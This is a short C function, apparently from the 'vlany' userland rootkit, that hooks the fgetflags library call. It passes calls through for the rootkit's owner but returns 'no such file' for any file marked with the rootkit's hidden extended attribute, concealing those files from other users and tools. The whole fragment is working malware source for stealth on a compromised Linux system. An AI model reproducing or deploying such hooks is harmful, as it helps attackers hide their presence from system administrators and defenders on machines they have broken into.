int fgetflags(const char *name, unsigned long *flags)
{
    #ifdef DEBUG
        printf("[vlany] fgetflags() called\n");
    #endif

    HOOK(old_fgetflags, CFGETFLAGS);

    if(owned()) return old_fgetflags(name, flags);

    if(hidden_xattr(name)) { errno = ENOENT; return -1; }

    return old_fgetflags(name, flags);
}
